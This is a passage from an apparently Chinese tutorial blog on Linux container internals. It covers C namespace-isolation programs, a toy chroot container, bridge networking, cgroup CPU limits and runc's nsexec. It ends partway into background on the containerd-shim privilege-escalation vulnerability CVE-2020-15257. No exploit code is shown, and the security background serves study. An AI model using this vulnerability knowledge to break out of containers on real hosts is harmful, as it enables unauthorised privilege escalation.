&#123; &quot;/bin/bash&quot;, NULL&#125;;int container_main(void* arg)&#123; printf(&quot;Container - inside the container!\\n&quot;); sethostname(&quot;container&quot;,10); /* 设置hostname */ execv(container_args[0], container_args); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent - start a container!\\n&quot;); /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */ int container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS, NULL); /* 等待子进程结束 */ waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; 子进程运行 hostname 查看主机名变成 container, 宿主机不变，这里注意如果是用 hostnamectl sethostname &lt;xxx&gt; 命令会改变宿主机的 hostname，因为这个命令是通过写文件实现的，这里并未做文件隔离 IPC Mamespace可通过 clone() 函数设置 CLONE_NEWIPC 标志位实现，需要 root 权限 ipc.c 123456789101112131415161718192021222324252627282930313233343536#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;/* 定义一个给 clone 用的栈，栈大小1M */#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/bin/bash&quot;, NULL&#125;;int container_main(void* arg)&#123; printf(&quot;Container - inside the container!\\n&quot;); sethostname(&quot;container&quot;,10); /* 设置hostname */ execv(container_args[0], container_args); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent - start a container!\\n&quot;); /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */ int container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, NULL); /* 等待子进程结束 */ waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; ipcmk -Q 创建一个进程通信消息队列，通过 ipcs -q 查看新建的队列。运行进程间通信隔离程序，子进程内运行 ipcs -q 看不到新建的队列 PID Namespace可通过 clone() 函数设置 CLONE_NEWPID 标志位实现，需要 root 权限 pid_ns.c 12345678910111213141516171819202122232425262728293031323334353637#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;/* 定义一个给 clone 用的栈，栈大小1M */#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/bin/bash&quot;, NULL&#125;;int container_main(void* arg)&#123; printf(&quot;Container [%5d] - inside the container!\\n&quot;, getpid()); printf(&quot;Container - inside the container!\\n&quot;); sethostname(&quot;container&quot;,10); /* 设置hostname */ execv(container_args[0], container_args); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent - start a container!\\n&quot;); /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */ int container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID, NULL); /* 等待子进程结束 */ waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; 运行进程隔离程序会发现我们程序的pid为1，pid为1是特殊的进程，在表1介绍中有列举一些特殊性这里直接 ps 会发现只有当前子进程的进程号，但通过 ps -ef 或者 top 命令会查看到所有进程号，这里是因为 ps -ef 会读取 /proc 文件系统，这里还未对此文件系统进行隔离 MNT Namespace可通过 clone() 函数设置 CLONE_NEWNS 标志位实现，需要 root 权限 mnt_ns.c 1234567891011121314151617181920212223242526272829303132333435363738#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;/* 定义一个给 clone 用的栈，栈大小1M */#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/bin/bash&quot;, NULL&#125;;int container_main(void* arg)&#123; printf(&quot;Container [%5d] - inside the container!\\n&quot;, getpid()); printf(&quot;Container - inside the container!\\n&quot;); sethostname(&quot;container&quot;,10); /* 设置hostname */ system(&quot;mount -t proc proc /proc&quot;); execv(container_args[0], container_args); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent - start a container!\\n&quot;); /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */ int container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS, NULL); /* 等待子进程结束 */ waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; 这里对 /proc 文件系统进行了隔离，此时在 ps -ef 或者 top 看到的也只有当前进程的进程号了，注意此程序会覆盖父进程的 /proc 系统，子进程退出后要通过 umount 或者 mount -t proc proc /proc当然除了 /proc 还有 /dev、/sys、/tmp、/run 等 一个玩具容器先创建一个 rootfs 1mkdir -p rootfs/&#123;bin,dev,etc,home,lib/x86_64-linux-gnu,lib64,mnt,opt,proc,root,run,sbin,sys,tmp,usr/bin,var&#125; 其中 lib/x86_64-linux-gnu 根据 ldd /bin 目录下各个命令结果的动态链接库来，我这里分别是 1234567891011121314151617181920cp /usr/bin/sh /usr/bin/ls /usr/bin/mount /usr/bin/cat /usr/bin/ps rootfs/usr/bin/cp /etc/hosts /etc/hostname /etc/resolv.conf rootfs/etccp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/x86_64-linux-gnu/cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64cp /lib/x86_64-linux-gnu/libselinux.so.1 rootfs/lib/x86_64-linux-gnu/libselinux.so.1cp /lib/x86_64-linux-gnu/libpcre2-8.so.0 rootfs/lib/x86_64-linux-gnu/libpcre2-8.so.0cp /lib/x86_64-linux-gnu/libdl.so.2 rootfs/lib/x86_64-linux-gnu/libdl.so.2cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/ld-linux-x86-64.so.2cp /lib/x86_64-linux-gnu/libpthread.so.0 rootfs/lib/x86_64-linux-gnu/libpthread.so.0cp /lib/x86_64-linux-gnu/libmount.so.1 rootfs/lib/x86_64-linux-gnu/libmount.so.1cp /lib/x86_64-linux-gnu/libblkid.so.1 rootfs/lib/x86_64-linux-gnu/libblkid.so.1cp /lib/x86_64-linux-gnu/libselinux.so.1 rootfs/lib/x86_64-linux-gnu/libselinux.so.1cp /lib/x86_64-linux-gnu/libprocps.so.8 rootfs/lib/x86_64-linux-gnu/libprocps.so.8cp /lib/x86_64-linux-gnu/libsystemd.so.0 rootfs/lib/x86_64-linux-gnu/libsystemd.so.0cp /lib/x86_64-linux-gnu/librt.so.1 rootfs/lib/x86_64-linux-gnu/librt.so.1cp /lib/x86_64-linux-gnu/liblzma.so.5 rootfs/lib/x86_64-linux-gnu/liblzma.so.5cp /lib/x86_64-linux-gnu/libzstd.so.1 rootfs/lib/x86_64-linux-gnu/libzstd.so.1cp /lib/x86_64-linux-gnu/liblz4.so.1 rootfs/lib/x86_64-linux-gnu/liblz4.so.1cp /lib/x86_64-linux-gnu/libgcrypt.so.20 rootfs/lib/x86_64-linux-gnu/libgcrypt.so.20cp /lib/x86_64-linux-gnu/libgpg-error.so.0 rootfs/lib/x86_64-linux-gnu/libgpg-error.so.0 chroot rootfs 改变根目录, 进入至新的文件系统里了，但是现在一些命名空间还没做隔离，加上上面的clone函数标志位 container.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/usr/bin/sh&quot;, &quot;-l&quot;, NULL&#125;;int container_main(void* arg)&#123; printf(&quot;Container [%5d] - inside the container!\\n&quot;, getpid()); //set hostname sethostname(&quot;container&quot;,10); //remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information if (mount(&quot;proc&quot;, &quot;rootfs/proc&quot;, &quot;proc&quot;, 0, NULL) !=0 ) &#123; perror(&quot;proc&quot;); &#125; if (mount(&quot;sysfs&quot;, &quot;rootfs/sys&quot;, &quot;sysfs&quot;, 0, NULL)!=0) &#123; perror(&quot;sys&quot;); &#125; if (mount(&quot;none&quot;, &quot;rootfs/tmp&quot;, &quot;tmpfs&quot;, 0, NULL)!=0) &#123; perror(&quot;tmp&quot;); &#125; if (mount(&quot;udev&quot;, &quot;rootfs/dev&quot;, &quot;devtmpfs&quot;, 0, NULL)!=0) &#123; perror(&quot;dev&quot;); &#125; if (mount(&quot;devpts&quot;, &quot;rootfs/dev/pts&quot;, &quot;devpts&quot;, 0, NULL)!=0) &#123; perror(&quot;dev/pts&quot;); &#125; if (mount(&quot;shm&quot;, &quot;rootfs/dev/shm&quot;, &quot;tmpfs&quot;, 0, NULL)!=0) &#123; perror(&quot;dev/shm&quot;); &#125; if (mount(&quot;tmpfs&quot;, &quot;rootfs/run&quot;, &quot;tmpfs&quot;, 0, NULL)!=0) &#123; perror(&quot;run&quot;); &#125; /* * 模仿Docker的从外向容器里mount相关的配置文件 * 你可以查看：/var/lib/docker/containers/&lt;container_id&gt;/目录， * 你会看到docker的这些文件的。 */ if (mount(&quot;conf/hosts&quot;, &quot;rootfs/etc/hosts&quot;, &quot;none&quot;, MS_BIND, NULL)!=0 || mount(&quot;conf/hostname&quot;, &quot;rootfs/etc/hostname&quot;, &quot;none&quot;, MS_BIND, NULL)!=0 || mount(&quot;conf/resolv.conf&quot;, &quot;rootfs/etc/resolv.conf&quot;, &quot;none&quot;, MS_BIND, NULL)!=0 ) &#123; perror(&quot;conf&quot;); &#125; /* chroot 隔离目录 */ if ( chdir(&quot;./rootfs&quot;) != 0 || chroot(&quot;./&quot;) != 0 )&#123; perror(&quot;chdir/chroot&quot;); &#125; execv(container_args[0], container_args); perror(&quot;exec&quot;); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent [%5d] - start a container!\\n&quot;, getpid()); int container_pid = clone(container_main, container_stack+STACK_SIZE, CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL); waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; 做了主机、进程、进程间通信、文件系统(包含 /dev /proc/sys /run /tmp 目录)隔离的代码 运行后悔挂在设备文件至 rootfs/dev 等目录，想要删除 rootfs 需要 umount -R rootfs/dev rootfs/proc rootfs/sys rootfs/run rootfs/tmp rootfs/etc/* 一下 User Namespace可通过 clone() 函数设置 CLONE_NEWUSER 标志位实现，但不需要 root 权限，通过普通用户运行，安全系数更高，就算被逃逸了也是一个普通用户权限 sys/capability.h头文件需要安装依赖 1apt install libcap-dev 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;#include &lt;sys/capability.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/bin/bash&quot;, NULL&#125;;int pipefd[2];void set_map(char* file, int inside_id, int outside_id, int len) &#123; FILE* mapfd = fopen(file, &quot;w&quot;); if (NULL == mapfd) &#123; perror(&quot;open file error&quot;); return; &#125; fprintf(mapfd, &quot;%d %d %d&quot;, inside_id, outside_id, len); fclose(mapfd);&#125;void set_uid_map(pid_t pid, int inside_id, int outside_id, int len) &#123; char file[256]; sprintf(file, &quot;/proc/%d/uid_map&quot;, pid); set_map(file, inside_id, outside_id, len);&#125;void set_gid_map(pid_t pid, int inside_id, int outside_id, int len) &#123; char file[256]; sprintf(file, &quot;/proc/%d/gid_map&quot;, pid); set_map(file, inside_id, outside_id, len);&#125;int container_main(void* arg)&#123; printf(&quot;Container [%5d] - inside the container!\\n&quot;, getpid()); printf(&quot;Container: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\\n&quot;, (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid()); /* 等待父进程通知后再往下执行（进程间的同步） */ char ch; close(pipefd[1]); read(pipefd[0], &amp;ch, 1); printf(&quot;Container [%5d] - setup hostname!\\n&quot;, getpid()); //set hostname sethostname(&quot;container&quot;,10); //remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information mount(&quot;proc&quot;, &quot;/proc&quot;, &quot;proc&quot;, 0, NULL); execv(container_args[0], container_args); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; const int gid=getgid(), uid=getuid(); printf(&quot;Parent: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\\n&quot;, (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid()); pipe(pipefd); printf(&quot;Parent [%5d] - start a container!\\n&quot;, getpid()); int container_pid = clone(container_main, container_stack+STACK_SIZE, CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | SIGCHLD, NULL); printf(&quot;Parent [%5d] - Container [%5d]!\\n&quot;, getpid(), container_pid); //To map the uid/gid, // we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent //The file format is // ID-inside-ns ID-outside-ns length //if no mapping, // the uid will be taken from /proc/sys/kernel/overflowuid // the gid will be taken from /proc/sys/kernel/overflowgid set_uid_map(container_pid, 0, uid, 1); set_gid_map(container_pid, 0, gid, 1); printf(&quot;Parent [%5d] - user/group mapping done!\\n&quot;, getpid()); /* 通知子进程 */ close(pipefd[1]); waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125; 写入/proc//uid_map(gid_map)文件的进程需要这个namespace中的CAP_SETUID (CAP_SETGID)权限，写入的进程必须是此user namespace的父或子的user namespace进程我这编译了 gid 映射文件没成功写入，原因可参考 https://man7.org/linux/man-pages/man7/user_namespaces.7.html /*Linux 3.19 made a change in the handling of setgroups(2) and the‘gid_map’ file to address a security issue. The issue allowedunprivileged users to employ user namespaces in order to dropThe upshot of the 3.19 changes is that in order to update the‘gid_maps’ file, use of the setgroups() system call in thisuser namespace must first be disabled by writing “deny” to one ofthe /proc/PID/setgroups files for this namespace. That is thepurpose of the following function.*/ 其实上述代码还涉及进程间同步问题，即有管道代码位置有点问题，有时会出现还未修改 /proc//uid_map(gid_map) 就已经获取了容器内的 uid 和 gid ，这里通过另外一种方式实现，解决进程同步问题，顺便设置了 setgroups 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;char* const container_args[] = &#123; &quot;/usr/bin/sh&quot;, NULL&#125;;char* const container_envp[] = &#123; &quot;PATH=/usr/bin&quot;, &quot;TERM=console&quot;, &quot;HOME=/root&quot;, NULL&#125;;void set_groups(char* file, char* value) &#123; FILE* groupfd = fopen(file, &quot;w&quot;); if (NULL == groupfd) &#123; perror(&quot;open file error&quot;); return; &#125; fprintf(groupfd, &quot;%s&quot;, value); fclose(groupfd);&#125;void set_map(char* file, int inside_id, int outside_id, int len) &#123; FILE* mapfd = fopen(file, &quot;w&quot;); if (NULL == mapfd) &#123; perror(&quot;open file error&quot;); return; &#125; fprintf(mapfd, &quot;%d %d %d&quot;, inside_id, outside_id, len); fclose(mapfd);&#125;int container_main(void* arg)&#123; printf(&quot;Container [%5d] - inside the container!\\n&quot;, getpid()); printf(&quot;Container: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\\n&quot;, (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid()); printf(&quot;Container [%5d] - setup hostname!\\n&quot;, getpid()); //set hostname sethostname(&quot;container&quot;,10); //set root directory chroot(&quot;rootfs&quot;); //change to `/` chdir(&quot;/&quot;); //remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information mount(&quot;proc&quot;, &quot;/proc&quot;, &quot;proc&quot;, 0, NULL); execvpe(container_args[0], container_args, container_envp); printf(&quot;Something&#x27;s wrong!\\n&quot;); return 1;&#125;int main()&#123; const int gid=getegid(), uid=geteuid(); printf(&quot;Parent: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\\n&quot;, (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid()); printf(&quot;Parent [%5d] - start a container!\\n&quot;, getpid()); unshare(CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET); pid_t container_pid = fork(); if (!container_pid) &#123; /* since Linux 3.19 unprivileged writing of /proc/self/gid_map * has s been disabled unless /proc/self/setgroups is written * first to permanently disable the ability to call setgroups * in that user namespace. */ set_groups(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;); //To map the uid/gid, // we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent //The file format is // ID-inside-ns ID-outside-ns length //if no mapping, // the uid will be taken from /proc/sys/kernel/overflowuid // the gid will be taken from /proc/sys/kernel/overflowgid set_map(&quot;/proc/self/uid_map&quot;, 0, uid, 1); set_map(&quot;/proc/self/gid_map&quot;, 0, gid, 1); return container_main(NULL); &#125; printf(&quot;Parent [%5d] - Container [%5d]!\\n&quot;, getpid(), container_pid); waitpid(container_pid, NULL, 0); printf(&quot;Parent [%5d] - container stopped!\\n&quot;, getpid()); return 0;&#125; 看了下这部分代码，发现和 Docker 的 nsexec.c 有几分相像 或者还有些疑问，因为这个是非 root 权限就可以设置的标志位，对于需要 root 权限的标志位，一般用户先创建User Namespace，然后把这个用户映射成root，在容器内用root来创建其它的Namesapce Network Namespace与上面几种Namespace一样，通过设置标志位 CLONE_NEWNET 即可实现网络隔离，比如 nc 监听 80 端口，并不会占用宿主机的端口 到这里，需要隔离的已经隔离的差不多了，为了更加直观的演示，下面通过命令模仿Docker中的网络命名空间 Docker 在宿主机上的网络示意图 在虚拟机上查看网络情况 ip link 123456781: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:002: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:50:56:3f:89:83 brd ff:ff:ff:ff:ff:ff7: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default link/ether 02:42:a3:2f:a2:a2 brd ff:ff:ff:ff:ff:ff17: veth706734a@if16: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP mode DEFAULT group default link/ether f6:59:f6:3a:5b:68 brd ff:ff:ff:ff:ff:ff link-netnsid 1 ip命令自带网络空间隔离功能，我们可以通过如下命令来做一个Docker桥接网络 12345678910111213141516171819202122232425262728293031323334## 先增加一个网桥lxcbr0，模仿docker0brctl addbr lxcbr0brctl stp lxcbr0 off# 为网桥设置IP地址ip addr add 192.168.10.1/24 dev lxcbr0 ip link set dev lxcbr0 up## 创建一个 network namespace - ns1# 增加一个 namesapce 命令为 ns1ip netns add ns1 # 激活namespace中的loopback，即127.0.0.1（使用ip netns exec ns1来操作ns1中的命令）ip netns exec ns1 ip link set dev lo up ## 然后，我们需要增加一对虚拟网卡# 增加一个对虚拟网卡，注意其中的veth类型，其中一个网卡要放到容器（命名空间）中ip link add veth-ns1 type veth peer name lxcbr0.1# 把 veth-ns1 放入 namespace ns1中，这样容器中就会有一个新的网卡了，并且宿主机的 veth-ns1 网卡会消失ip link set veth-ns1 netns ns1# 把容器里的 veth-ns1改名为 eth0 （容器外会冲突，容器内就不会了）ip netns exec ns1 ip link set dev veth-ns1 name eth0 # 为容器中的网卡分配一个IP地址，并激活它ip netns exec ns1 ip addr add 192.168.10.11/24 dev eth0ip netns exec ns1 ip link set dev eth0 up# 上面我们把veth-ns1这个网卡放入容器中，这里我们把lxcbr0.1添加上网桥上brctl addif lxcbr0 lxcbr0.1# 这步激活不能忘了, 否则会因 lxcbr0 网桥这边的 veth 为启用导致命名空间内检测不到另外一端# 谢谢向磊哥帮忙看了下，一开始没加这句，导致网络一直不通，自己排查了挺久没发现ip link set dev lxcbr0.1 up 可以通过 brctl show 命令查看网桥接入的网卡情况，并且可以通过执行 ip netns exec ns1 ping 192.168.10.1 测试命名空间内的网络是否与lxcbr0网桥正常通信 要想容器内访问外部网络，需要添加路由，需要域名解析需要添加dns解析 1234567# 为容器增加一个路由规则，让容器可以访问外面的网络ip netns exec ns1 ip route add default via 192.168.10.1# 在/etc/netns下创建network namespce名称为ns1的目录，# 然后为这个namespace设置resolv.conf，这样，容器内就可以访问域名了mkdir -p /etc/netns/ns1echo &quot;nameserver 8.8.8.8&quot; &gt; /etc/netns/ns1/resolv.conf 如果在虚拟机内还需要设置网卡为混杂模式 CGroups Namespace[15]推荐阅读 Cgroup概述[16] cgroup是Linux下的一种将进程按组进行管理的机制，在用户层看来，cgroup技术就是把系统中的所有进程组织成一颗一颗独立的树，每棵树都包含系统的所有进程，树的每个节点是一个进程组，而每颗树又和一个或者多个subsystem关联，树的作用是将进程分组，而subsystem的作用就是对这些组进行操作 cgroups (control groups) 主要包括 subsystem 和 hierarchy 两部分 1个subsystem就是一个内核模块，目前Linux支持下面12种subsystem cpu (since Linux 2.6.24; CONFIG_CGROUP_SCHED)用来限制cgroup的CPU使用率。 cpuacct (since Linux 2.6.24; CONFIG_CGROUP_CPUACCT)统计cgroup的CPU的使用率。 cpuset (since Linux 2.6.24; CONFIG_CPUSETS)绑定cgroup到指定CPUs和NUMA节点。 memory (since Linux 2.6.25; CONFIG_MEMCG)统计和限制cgroup的内存的使用率，包括process memory, kernel memory, 和swap。 devices (since Linux 2.6.26; CONFIG_CGROUP_DEVICE)限制cgroup创建(mknod)和访问设备的权限。 freezer (since Linux 2.6.28; CONFIG_CGROUP_FREEZER)suspend和restore一个cgroup中的所有进程。 net_cls (since Linux 2.6.29; CONFIG_CGROUP_NET_CLASSID)将一个cgroup中进程创建的所有网络包加上一个classid标记，用于tc和iptables。 只对发出去的网络包生效，对收到的网络包不起作用。 blkio (since Linux 2.6.33; CONFIG_BLK_CGROUP)限制cgroup访问块设备的IO速度。 perf_event (since Linux 2.6.39; CONFIG_CGROUP_PERF)对cgroup进行性能监控 net_prio (since Linux 3.3; CONFIG_CGROUP_NET_PRIO)针对每个网络接口设置cgroup的访问优先级。 hugetlb (since Linux 3.5; CONFIG_CGROUP_HUGETLB)限制cgroup的huge pages的使用量。 pids (since Linux 4.3; CONFIG_CGROUP_PIDS)限制一个cgroup及其子孙cgroup中的总进程数。 1个hierarchy可以理解为1颗cgroup树 12cat /proc/cgroupsmount | grep cgroup 查看当前系统支持的subsystem和当前系统已经挂载的subsystem 这里先关注 cpu 的，进入 cpu subsystem目录，创建一个组名为 tari 的cgroup，并查看当前目录 1cd /sys/fs/cgroup/cpu &amp;&amp; mkdir tari &amp;&amp; ll tari 发现在subsystem创建目录会生成一些默认文件，通过控制文件里的数值，从而对资源进行限制。 如果往 cpu.cfs_quota_us文件写入100000（十万），就限制 tari 的cgroup最多能够使用1核的CPU（因为cpu.cfs_period_us配置文件默认把1核cpu分成了10万份）。写入20000，证明最多使用使用1/5核的CPU。 1echo 20000 &gt; /sys/fs/cgroup/cpu/tari/cpu.cfs_quota_us 首先，新起一个进程，运行 CPU 占用率为 100%，这时把 PID 16336 加入 tari cgroup 1echo 16336 &gt; /sys/fs/cgroup/cpu/tari/tasks 可以看到CPU占用率为20%左右，其实从写入的配置文件名 cpu.cfs_quota_us 也易知是 CPU 配额，容器里的配额其实也是这么一回事，对于其他资源的限制，也是类似的思路 Docker 也是通过这种方式实现对容器进行资源隔离[17] 默认Docker启动一个容器后会在 /sys/fs/cgroup 目录下的各个subsystem目录生成以容器ID为名字的目录，如 1/sys/fs/cgroup/cpu/docker/4a9df9dcac71e4475838e207e932a793faa034c1eb7bb7b75786ca5a1308c436 Docker中命名空间隔离的实现Docker 底层即 runc：https://github.com/opencontainers/runc src/github.com/opencontainers/runc/init.go import (&quot;... _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot; ...&quot;) -&gt; src/github.com/opencontainers/runc/libcontainer/nsenter/nsenter.go __attribute__((constructor)) init(void) 的 nsexec(); 这段 cgo 利用 gcc constructor 特性让这段C代码先于Go的runtime启动之前执行 nsenter_gccgo.go 中的 if AlwaysFalse 条件一开始我以为是会某种条件满足，实际并不用管，这只是如注释所说为了编译器可以成功编译它，正在是通过 __attribute__ 特殊构造函数调的 -&gt; nsexec.c nsexec(); 实现命名空间和资源隔离的核心代码，与我们在 User Namespace 改进后的代码有几分相似 因为Docker需要支持rootless等场景下的命名空间隔离，此外由表1知一些老的内核版本不一定支持或实现了较新的（如 USER）命名空间。Docker为了更高的可拓展性，不能直接像在 【C实现命名空间隔离实验】 小节一样把相应的标志位置于 clone 函数内，所以 Docker 结合 clone、unshare和setns实现。 因个人对 runc 和 docker 之间的交互逻辑目前处于一种看懂状态，感觉别人讲的更好，推荐阅读 runc源码分析 [18] 想进一步了解Docker，推荐阅读 理解Docker系列文章[19] 命名空间隔离不当漏洞 CVE-2020-15257该漏洞是 containerd 层导致的，可参照 Docker (远程) Debug 调试环境搭建 - TARI TARI - 0x02 Docker架构组成 部分 漏洞环境环境部署 1./metarget cnv install cve-2020-15257 漏洞影响版本 containerd 1.3.x, 1.2.x, 1.4.x版本 复现组件版本 123456789root@ubuntu /o/metarget# docker -vDocker version 18.03.1-ce, build 9ee9f40root@ubuntu /o/metarget# containerd -vcontainerd github.com/containerd/containerd 1.5.5-0ubuntu3~18.04.2root@ubuntu /o/metarget# runc -vrunc version 1.0.1-0ubuntu2~18.04.1spec: 1.0.2-devgo: go1.13.8libseccomp: 2.5.1 利用条件 网络模式为host的情况下，即容器启动时指定 --net=host 参数 漏洞描述 Access controls for the shim’s API socket verified that the connecting process had an effective UID of 0, but did not otherwise restrict access to the abstract Unix domain socket. This would allow malicious containers running in the same network namespace as the shim, with an effective UID of 0 but otherwise reduced privileges, to cause new processes to be run with elevated privileges. 前置知识Unix套接字在Linux系统中，可通过Unix域套接字在同一个主机上的进程之间进行通信，它的API调用方法和普通的TCP/IP的套接字一样，也是调用socket函数创建一个套接字，域设置成AF_UNIX 1socket(AF_UNIX, SOCK_STREAM 或 SOCK_DGRAM, 0); 在调用socket()函数获得新创建的Unix域套接字的文件描述符之后，再调用bind()函数将它绑定到一个本地地址上，此时需要创建并初始化一个sockaddr_un结构体，如下所示： 1234struct sockaddr_un &#123; sa_family_t sun_family; char sun_path[108]; &#125; 第一个字段 sa_family_t 需要设置成 AF_UNIX，第二个字段 sun_path 表示的是一个路径名，它分为两种： 普通的文件路径： 它是一个合法的Linux文件路径，以NULL结尾。在绑定一个Unix域套接字时，会在文件系统中的相应位置上创建一个文件，当不再需要这个Unix域套接字时，可以使用remove()函数或者unlink()函数将这个对应的文件删除。如果在文件系统中，已经有了一个文件和指定的路径名相同，则绑定会失败。 抽象名字空间路径： 抽象名字空间路径以NULL开始，后面可以跟任何数据，甚至可以是NULL，可以不以NULL结尾。相对于普通的文件路径，这种地址在文件系统上并没有实际的文件与它相对应。 也就是说，它不会在文件系统中创建出一个新的文件。在Unix域套接字的文件描述符关闭的时候就会自动消失，所以无需担心与文件系统中已存在的文件产生命名冲突，也不需要在使用完套接字之后删除附带产生的这个文件。 docker网络模式在使用docker run命令创建并运行容器时，可以使用–network选项指定容器的网络模式。 Docker有以下4种网络模式： none：这种模式下容器内部只有loopback回环网络，没有其他网卡，不能访问外网，完全封闭的网络； container：指定一个已经存在的容器名字，新的容器会和这个已经存在的容器共享一个网络命名空间，IP、端口范围也一起在这两个容器中共享； bridge：这是docker默认的网络模式，会为每一个容器分配网络命名空间，设置IP，保证容器内的进程使用独立的网络环境，使得容器和容器之间、容器和主机之间实现网络隔离； host：这种模式下，容器和主机已经没有网络隔离了，它们共享同一个网络命名空间，容器的网络配置和主机完全一样，使用主机的IP地址和端口，可以查看到主机所有网卡信息、网络资源，在网络性能上没有损耗。 但也正是因为没有网络隔离，容器和主机容易产生网络资源冲突、争抢，以及其他的一些问题。本文所述漏洞也是在这种模式下产生的。 漏洞原因每次启动一个容器时，containerd会创建一个新的containerd-shim进程，由containerd-shim进程（而不是containerd）来直接控制容器的整个生命周期。 containerd在创建containerd-shim之前，会创建一个Unix域套接字，设置的是抽象名字空间路径： https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/linux/bundle.go#L136 1234func (b 